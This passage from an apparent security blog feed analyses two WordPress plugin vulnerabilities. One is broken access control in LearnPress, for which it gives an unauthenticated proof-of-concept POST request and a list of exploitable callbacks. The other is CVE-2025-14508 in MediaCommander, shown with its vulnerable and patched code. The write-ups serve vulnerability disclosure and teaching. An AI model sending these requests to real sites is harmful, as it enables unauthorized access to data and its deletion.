9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send request with lp-load-ajax parameter&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;LoadContentViaAjax::catch_lp_ajax() triggered via init hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Check lp-load-ajax parameter exists&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Create instance of LoadContentViaAjax&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Class in $class_no_nonce whitelist → Skip nonce check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Retrieve $class and $method from request data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check if $class:$method is in $allow_callbacks (all callbacks allowed)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;is_callable([class, method])?&amp;#34;]&#xA;I --&amp;gt;|Yes| J[&amp;#34;Execute callback via call_user_func([class, method], args)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Sensitive admin-only data returned to attacker&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send a request with an Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1&#xA;Host: localhost&#xA;Referer: http://localhost&#xA;&#xA;lp-load-ajax=load_content_via_ajax&amp;amp;data={&amp;#34;callback&amp;#34;:{&amp;#34;class&amp;#34;:&amp;#34;LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;render_list_items_not_assign&amp;#34;},&amp;#34;args&amp;#34;:{&amp;#34;quiz_id&amp;#34;:483}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Other valid callback lists:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Broken Access Control&lt;/strong&gt; vulnerability in LearnPress &amp;lt;= 4.3.1 allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to execute AJAX callbacks that were intended only for admins. The issue occurs because the API does not check &lt;strong&gt;capability/permission&lt;/strong&gt; before calling &lt;code&gt;call_user_func([class, method], args)&lt;/code&gt;. Patch 4.3.2 has limited the valid callbacks and requires Administrator privileges, preventing unauthorized access.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never allow dynamic callbacks to execute without checking permissions.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;lp-load-ajax&lt;/code&gt; endpoint can become a vulnerability if the callback list is not restricted.&lt;/li&gt;&#xA;&lt;li&gt;Always validate &lt;code&gt;nonce&lt;/code&gt; or check &lt;strong&gt;referer/domain&lt;/strong&gt; to reduce risks from invalid requests.&lt;/li&gt;&#xA;&lt;li&gt;Patches should &lt;strong&gt;hardcode the callback list&lt;/strong&gt; and combine it with admin privilege checks for sensitive functions.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control often occurs in AJAX/REST APIs when developers trust input data from the client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-wordpress-lms-plugin-plugin-4-3-1-missing-authorization-to-unauthenticated-orders-statistics-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;</description>
    </item>
    <item>
      <title>CVE-2025-14508 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-15-cve-2025-14508/</link>
      <pubDate>Mon, 15 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-15-cve-2025-14508/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The MediaCommander – Bring Folders to Media, Posts, and Pages&lt;/strong&gt; for WordPress has an &lt;strong&gt;unauthorized data deletion&lt;/strong&gt; vulnerability due to &lt;strong&gt;missing capability check&lt;/strong&gt; at the &lt;strong&gt;REST API endpoint &lt;code&gt;import-csv&lt;/code&gt;&lt;/strong&gt; in all versions &lt;strong&gt;≤ 2.3.1&lt;/strong&gt;.&#xA;The root cause is that this endpoint only checks for &lt;strong&gt;&lt;code&gt;upload_files&lt;/code&gt;&lt;/strong&gt; capability (&lt;strong&gt;Author level&lt;/strong&gt;) for a &lt;strong&gt;destructive action&lt;/strong&gt; that can &lt;strong&gt;delete all folders&lt;/strong&gt;.&#xA;This allows &lt;strong&gt;an authenticated attacker&lt;/strong&gt;, with &lt;strong&gt;Author or higher privileges&lt;/strong&gt;, to &lt;strong&gt;delete all folder organization data&lt;/strong&gt; created by &lt;strong&gt;Administrators&lt;/strong&gt; and &lt;strong&gt;other users&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-14508&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-14508&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mediacommander/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;MediaCommander – Bring Folders to Media, Posts, and Pages&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.3.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a &lt;strong&gt;REST API&lt;/strong&gt; endpoint &lt;code&gt;/import-csv&lt;/code&gt; with POST method as follows:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL, // mediacommander/v1&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE, // POST&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canUploadFiles&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; is &lt;code&gt;canUploadFiles&lt;/code&gt; to check capabilities:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canUploadFiles() {&#xA;    return current_user_can( &amp;#39;upload_files&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;upload_files&lt;/code&gt; capability is for users from Author level and above.&lt;/li&gt;&#xA;&lt;li&gt;If the user lacks the capability, the REST API returns 403.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;If the user has the capability, the callback &lt;code&gt;importCSV&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function importCSV( \WP_REST_Request $request ) {&#xA;    $params  = $request-&amp;gt;get_file_params();&#xA;    $file = $params[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];&#xA;    $clear  = filter_var( $request-&amp;gt;get_param( &amp;#39;clear&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;    $attachments  = filter_var( $request-&amp;gt;get_param( &amp;#39;attachments&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;&#xA;    $data = FoldersModel::importCSV( $file, $clear, $attachments );&#xA;    $response = isset( $data ) ? [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; $data ] : [ &amp;#39;success&amp;#39; =&amp;gt; false ];&#xA;&#xA;    return new \WP_REST_Response( $response );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;importCSV&lt;/code&gt; performs:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieves the CSV file from the request.&lt;/li&gt;&#xA;&lt;li&gt;Retrieves the &lt;code&gt;clear&lt;/code&gt; and &lt;code&gt;attachments&lt;/code&gt; parameters and converts them to boolean.&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;FoldersModel::importCSV&lt;/code&gt; to process the CSV data.&lt;/li&gt;&#xA;&lt;li&gt;Returns JSON containing &lt;code&gt;success&lt;/code&gt; and &lt;code&gt;data&lt;/code&gt; (if any) or &lt;code&gt;success: false&lt;/code&gt; on failure.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;&lt;p&gt;The &lt;code&gt;clear&lt;/code&gt; parameter will delete all existing folders if set to &lt;code&gt;true&lt;/code&gt;.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#34; title=&#34;Clear parameter&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/clear.png&#34; data-sub-html=&#34;&lt;h2&gt;clear&lt;/h2&gt;&lt;p&gt;Clear parameter&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#39; alt=&#34;clear&#34; height=&#34;209&#34; width=&#34;1091&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Clear parameter&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch (v2.4.0)&lt;/strong&gt; fixes the vulnerability by changing the capability check logic:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL,&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canManageOptions&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; is &lt;code&gt;canManageOptions&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canManageOptions() {&#xA;    return current_user_can( &amp;#39;manage_options&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; capability is for users from Administrator level and above.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Authenticated user (Author&amp;#43;)&amp;#34;] --&amp;gt; B[&amp;#34;POST /wp-json/mediacommander/v1/import-csv&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;permission_callback: canUploadFiles()&amp;#34;]&#xA;C --&amp;gt; D{&amp;#34;Has upload_files capability?&amp;#34;}&#xA;D -- Yes --&amp;gt; E[&amp;#34;importCSV() executes&amp;#34;]&#xA;D -- No --&amp;gt; Z[&amp;#34;403 Forbidden&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Read CSV file and parameters (clear, attachments)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;clear == true?&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;Delete all existing folders&amp;#34;]&#xA;H --&amp;gt; K[&amp;#34;Broken Access Control: destructive action allowed for Author&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  